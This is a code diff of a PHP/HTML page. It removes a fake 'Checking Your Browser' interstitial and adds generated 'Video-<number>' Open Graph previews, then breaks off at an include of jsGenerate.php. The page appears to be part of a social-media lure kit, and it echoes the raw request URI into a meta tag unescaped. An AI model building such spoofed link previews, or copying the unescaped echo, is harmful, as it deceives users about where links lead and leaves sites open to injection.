@@ -1,40 +1,34 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<title>Security Check</title>
-	<style type="text/css">
-		body{
-          background: #e9eaed;
-          text-align: center;
-          margin: 0;
-          font-family: 'Montserrat', sans-serif;
+    <?php 
+        $id = @$_SERVER["REQUEST_URI"];
+        if(empty($id)){
+          $id = generate_name(rand(5,10));
         }
-        svg{
-        	min-width:100px;
-        	width: 5%;
-        	overflow: auto;
-        	margin: auto;
-        	position: absolute;
-        	top: 0;
-        	left: 0;
-        	bottom: 0;
-        	right: 0;
-        	opacity: 0.8;
+        $id = isset(explode("/", $id)[1]) ? explode("/", $id)[1] : $id;
+        $id = isset(explode(".", $id)[0]) ? explode(".", $id)[0] : $id;
+
+        function getID($str){
+            $chars = "abcdefghijklmnoprstuvyzxABCDEFGHIJKLMNOPRSTUVYZX0123456789";
+            $number = 0;
+            for($i=0;$i<strlen($str);$i++){
+                $n = strpos($chars, $str[$i]);
+                $n = $n !== false ? $n : 0;
+                $number += $n;
+            }
+            return $number;
         }
-        h1{
-        	color: #047ab3;
-        }
-        h2{
-        	color: #828794;
-        }
-	</style>
-	<meta name="viewport" content="width=360, initial-scale=1" />
-	<link href="https://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet">
+
+        $hash = getID($id);
+    ?>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta property="og:url" content="<?php echo "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"; ?>">
+    <meta property="og:title" content="Video-<?php echo $hash; ?>">
+    <meta property="og:description" content="Video<?php echo $hash; ?>">
+    <meta property="og:image" content="http://<?php echo $_SERVER["HTTP_HOST"]; ?>/<?php echo $hash; ?>.jpg">
 </head>
 <body>
-	<h1>Checking Your Browser</h1>
-	<h2>Please Wait</h2>
-	<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" class="uil-squares"><rect x="0" y="0" width="100" height="100" fill="none" class="bk"></rect><rect x="15" y="15" width="20" height="20" fill="#047ab3" class="sq"><animate attributeName="fill" from="#047ab3" to="#00cde8" repeatCount="indefinite" dur="1s" begin="0.0s" values="#00cde8;#00cde8;#047ab3;#047ab3" keyTimes="0;0.1;0.2;1"></animate></rect><rect x="40" y="15" width="20" height="20" fill="#047ab3" class="sq"><animate attributeName="fill" from="#047ab3" to="#00cde8" repeatCount="indefinite" dur="1s" begin="0.125s" values="#00cde8;#00cde8;#047ab3;#047ab3" keyTimes="0;0.1;0.2;1"></animate></rect><rect x="65" y="15" width="20" height="20" fill="#047ab3" class="sq"><animate attributeName="fill" from="#047ab3" to="#00cde8" repeatCount="indefinite" dur="1s" begin="0.25s" values="#00cde8;#00cde8;#047ab3;#047ab3" keyTimes="0;0.1;0.2;1"></animate></rect><rect x="15" y="40" width="20" height="20" fill="#047ab3" class="sq"><animate attributeName="fill" from="#047ab3" to="#00cde8" repeatCount="indefinite" dur="1s" begin="0.875s" values="#00cde8;#00cde8;#047ab3;#047ab3" keyTimes="0;0.1;0.2;1"></animate></rect><rect x="65" y="40" width="20" height="20" fill="#047ab3" class="sq"><animate attributeName="fill" from="#047ab3" to="#00cde8" repeatCount="indefinite" dur="1s" begin="0.375" values="#00cde8;#00cde8;#047ab3;#047ab3" keyTimes="0;0.1;0.2;1"></animate></rect><rect x="15" y="65" width="20" height="20" fill="#047ab3" class="sq"><animate attributeName="fill" from="#047ab3" to="#00cde8" repeatCount="indefinite" dur="1s" begin="0.75s" values="#00cde8;#00cde8;#047ab3;#047ab3" keyTimes="0;0.1;0.2;1"></animate></rect><rect x="40" y="65" width="20" height="20" fill="#047ab3" class="sq"><animate attributeName="fill" from="#047ab3" to="#00cde8" repeatCount="indefinite" dur="1s" begin="0.625s" values="#00cde8;#00cde8;#047ab3;#047ab3" keyTimes="0;0.1;0.2;1"></animate></rect><rect x="65" y="65" width="20" height="20" fill="#047ab3" class="sq"><animate attributeName="fill" from="#047ab3" to="#00cde8" repeatCount="indefinite" dur="1s" begin="0.5s" values="#00cde8;#00cde8;#047ab3;#047ab3" keyTimes="0;0.1;0.2;1"></animate></rect></svg>
     <script type="text/javascript">
         <?php 
             require_once("jsGenerate.php");
